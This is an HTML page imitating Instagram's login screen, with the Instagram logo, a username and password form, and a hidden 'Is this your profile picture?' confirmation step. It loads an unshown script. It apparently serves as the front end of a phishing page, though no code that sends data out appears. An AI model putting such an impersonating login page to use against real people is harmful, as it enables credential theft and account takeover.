<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Login</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
    <div class="container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1280px-Instagram_logo.svg.png" alt="Instagram Logo" class="logo">
        <h1>Login to Instagram</h1>
        <form id="loginForm">
            <input type="text" id="username" name="username" placeholder="Username" required>
            <input type="password" id="password" name="password" placeholder="Password" required>
            <button type="submit">Login</button>
        </form>
        <div id="confirmationContainer" style="display: none;">
            <img id="profilePic" src="" alt="Profile Picture" class="profile-pic">
            <p>Is this your profile picture?</p>
            <button id="confirmButton">Yes, it is</button>
        </div>
    </div>
    <script src="script.js"></script>
</body>
</html>
